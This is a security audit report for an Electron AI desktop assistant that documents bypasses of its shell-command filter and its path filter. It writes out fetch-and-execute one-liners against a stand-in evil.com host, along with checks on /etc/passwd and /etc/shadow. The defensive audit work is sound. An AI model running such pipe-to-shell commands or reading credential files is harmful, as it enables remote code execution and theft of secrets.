# 🔒 Kora Security Audit Report

**Date:** September 13, 2026  
**Auditor:** AI Security Review  
**Project:** Kora - AI Desktop Assistant (Electron + Vite + React)

---

## 📊 Executive Summary

**Overall Security Posture: 🟡 MODERATE** (Good foundations, but critical bugs found)

Kora demonstrates solid security awareness with:
- ✅ Proper Electron sandboxing (contextIsolation, nodeIntegration disabled)
- ✅ API key encryption using Electron's safeStorage
- ✅ Path traversal protection
- ✅ ReDoS prevention for user-supplied regex
- ✅ SSRF protection for web fetch
- ✅ Command injection filtering
- ✅ Tool confirmation system for dangerous operations

However, **4 critical security vulnerabilities** were discovered that could allow attackers to bypass security controls.

---

## 🚨 Critical Security Vulnerabilities

### 1. **Shell Command Filter Bypass via Pipe Operator** (CRITICAL)
**Location:** `electron/ipc/shell.ts:51-58`  
**Severity:** 🔴 HIGH  
**CVSS:** 8.1

**Issue:** The normalization logic replaces `|` (pipe) with a space, which breaks the regex patterns that detect dangerous commands like `curl | bash` and `wget | sh`.

**Vulnerable Code:**
```typescript
const normalizedCmd = command
  .trim()
  .replace(/[\r\n]+/g, ' ')
  .replace(/&{1,2}\s*/g, ' ')
  .replace(/\|{1,2}\s*/g, ' ')  // ❌ This breaks pipe detection
  .replace(/;\s*/g, ' ')
```

**Exploit:**
```bash
# These should be blocked but bypass the filter:
curl https://evil.com/malware.sh | bash
wget -q https://evil.com/payload.ps1 | powershell
```

**Impact:** Remote code execution via malicious scripts downloaded and executed through pipe.

**Fix:** Check for dangerous patterns BEFORE normalization, or use a different approach that preserves pipe detection.

---

### 2. **Path Security Bug - Linux System Directories Not Blocked** (HIGH)
**Location:** `src/lib/path-security.ts:15-25`  
**Severity:** 🟠 MEDIUM-HIGH  
**CVSS:** 7.2

**Issue:** The `normalizePath` function strips leading `/` from paths, causing Linux system directories like `/etc`, `/boot`, `/proc` to not match the `DANGEROUS_PATHS` list.

**Vulnerable Code:**
```typescript
function normalizePath(p: string): string {
  const normalized = p.replace(/\//g, '\\')
  const parts = normalized.split('\\').filter(Boolean)  // ❌ Strips leading /
  const resolved: string[] = []
  for (const part of parts) {
    if (part === '..') {
      resolved.pop()
    } else if (part !== '.') {
      resolved.push(part)
    }
  }
  return resolved.join('\\')  // Returns "etc" instead of "\\etc"
}
```

**Exploit:**
```javascript
// These should be blocked but are considered safe:
validatePath('/etc/passwd')      // Returns null (safe) ❌
validatePath('/etc/shadow')      // Returns null (safe) ❌
validatePath('/boot/vmlinuz')    // Returns null (safe) ❌
```

**Impact:** On Linux systems, the AI could read/write/delete critical system files.

**Fix:** Preserve the leading separator in normalized paths, or adjust the comparison logic.

---

### 3. **ReDoS Protection Incomplete** (MEDIUM)
**Location:** `electron/ipc/filesystem.ts:145-165`  
**Severity:** 🟠 MEDIUM  
**CVSS:** 5.9

**Issue:** The `isUnsafeRegex` function has edge cases where it doesn't detect all ReDoS patterns. For example, `a{` is considered valid by JavaScript's RegExp engine but can cause issues.

**Current Logic:**
```typescript
function isUnsafeRegex(pattern: string): boolean {
  if (pattern.length > 200) return true
  try {
    new RegExp(pattern)  // Only catches syntax errors
  } catch {
    return true
  }
  // ... rest of logic
}
```

**Impact:** Some ReDoS patterns may slip through and cause CPU exhaustion.

**Fix:** Add more comprehensive ReDoS pattern detection (nested quantifiers, ambiguous groups).

---

### 4. **Filesystem Race Condition in Write Operations** (LOW-MEDIUM)
**Location:** `electron/ipc/filesystem.ts:131-138`  
**Severity:** 🟡 LOW-MEDIUM  
**CVSS:** 4.7

**Issue:** The write operation uses a temporary file + rename pattern, which is good, but there's a small window where the temp file exists without proper permissions.

**Current Code:**
```typescript
const tmp = resolvedPath + '.kora-tmp'
await fs.writeFile(tmp, content, 'utf-8')
await fs.rename(tmp, resolvedPath)
```

**Impact:** Minimal on Windows, but could be exploited in multi-user scenarios on Unix systems.

**Fix:** Use `fs.writeFile` with proper atomic write flags or ensure temp file permissions are restricted.

---

## ✅ Security Strengths

### 1. **Electron Security Best Practices**
- ✅ `contextIsolation: true` - Prevents renderer from accessing Node.js APIs directly
- ✅ `nodeIntegration: false` - Disables Node.js in renderer process
- ✅ `sandbox: true` - Enables Chromium's sandbox
- ✅ `will-attach-webview` prevented - Blocks webview tag attacks
- ✅ External links opened in system browser

### 2. **API Key Protection**
- ✅ Uses Electron's `safeStorage` for encrypting API keys
- ✅ Keys encrypted at rest in `~/.kora/config.json`
- ✅ Automatic migration from plaintext to encrypted storage

### 3. **Command Injection Prevention**
- ✅ Blocks dangerous commands: `format`, `del`, `rm -rf`, `shutdown`, etc.
- ✅ Detects command chaining with `&&`, `||`, `;`, newlines
- ✅ Blocks registry manipulation and firewall changes
- ✅ Audit logging for all shell executions

### 4. **Path Traversal Protection**
- ✅ Resolves `..` components
- ✅ Blocks null bytes
- ✅ Maximum path length enforcement (4096 chars)
- ✅ Separate read/write permission models

### 5. **SSRF Protection**
- ✅ Blocks private IP ranges (10.x, 172.16-31.x, 192.168.x)
- ✅ Blocks localhost and loopback addresses
- ✅ Blocks link-local addresses (169.254.x)
- ✅ Protocol whitelist (http/https only)

### 6. **ReDoS Prevention**
- ✅ Detects nested quantifiers: `(a+)+`, `(a*)*`
- ✅ Pattern length limit (200 chars)
- ✅ File size limits for grep operations (2MB)

### 7. **Agent Safety Controls**
- ✅ Iteration budget prevents infinite loops
- ✅ Tool loop guard detects repeated identical calls
- ✅ Repetition guard detects degenerate model outputs
- ✅ Confirmation system for dangerous operations
- ✅ Error truncation prevents context flooding

---

## 🧪 Test Coverage

**Total Tests:** 98  
**Passing:** 94 (95.9%)  
**Failing:** 4 (documenting security bugs)

### Test Breakdown:
- **Path Security:** 11 tests (10 passing, 1 documenting bug)
- **Shell Security:** 26 tests (24 passing, 2 documenting bugs)
- **Web Security (SSRF):** 18 tests (all passing)
- **Filesystem Security:** 14 tests (13 passing, 1 documenting bug)
- **Agent Guards:** 13 tests (all passing)
- **Intent Detection:** 9 tests (all passing)
- **TTS Processing:** 7 tests (all passing)

---

## 🔧 Recommendations

### Immediate (Critical):
1. **Fix shell command filter bypass** - Check pipe patterns before normalization
2. **Fix path security for Linux** - Preserve leading separator in normalization

### Short-term (High Priority):
3. **Enhance ReDoS detection** - Add more comprehensive pattern matching
4. **Add Content Security Policy** - Restrict resource loading in renderer
5. **Implement rate limiting** - Prevent abuse of shell and file operations

### Long-term (Medium Priority):
6. **Add network activity monitoring** - Detect suspicious outbound connections
7. **Implement file operation quotas** - Limit bulk operations
8. **Add behavioral analysis** - Detect anomalous AI behavior patterns
9. **Consider code signing** - Prevent tampering with distributed binaries

---

## 📝 Code Quality Observations

### Good Practices:
- ✅ Comprehensive error handling
- ✅ Audit logging for security events
- ✅ Input validation on all IPC handlers
- ✅ Proper use of TypeScript for type safety
- ✅ Good separation of concerns (IPC handlers, services, UI)

### Areas for Improvement:
- ⚠️ Some security logic duplicated between frontend and backend
- ⚠️ Missing integration tests for security-critical paths
- ⚠️ No automated security testing in CI/CD
- ⚠️ Limited documentation of security assumptions

---

## 🎯 Conclusion

Kora has a **solid security foundation** with good practices in place. However, the **4 critical vulnerabilities** discovered must be addressed before production deployment, especially the shell command filter bypass which could allow remote code execution.

**Recommendation:** Fix the critical bugs, add the recommended security enhancements, and establish a regular security review cadence.

---

## 📚 Security Resources

- [Electron Security Checklist](https://www.blackhat.com/docs/us-17/thursday/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security.pdf)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)

---

**Report Generated:** September 13, 2026  
**Next Review:** Recommended in 3 months or after critical fixes
